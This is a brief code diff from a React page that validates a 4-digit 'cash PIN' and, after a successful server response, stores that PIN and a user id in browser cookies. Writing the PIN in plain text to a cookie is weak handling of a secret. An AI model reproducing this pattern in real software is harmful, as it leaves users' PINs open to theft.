@@ -116,8 +116,8 @@ function Page() {
 
   const handleContinue = async () => {
        if (!cashPin || cashPin.length !== 4) {
-  toast.error("Cash Pin  has to be only 4 digits and not empty");
-  return;
+  return toast.error("Cash Pin  has to be only 4 digits and not empty");
+
      }
 
 
@@ -140,8 +140,8 @@ function Page() {
     if (res.ok) {
       Cookies.set("cashCard", data?.info?.cashPin);
       Cookies.set("id", data?.info?._id);
-      // router.push("/password");
-    } else {
+setCashPin() 
+   } else {
       console.log("error", data);
     }
   };
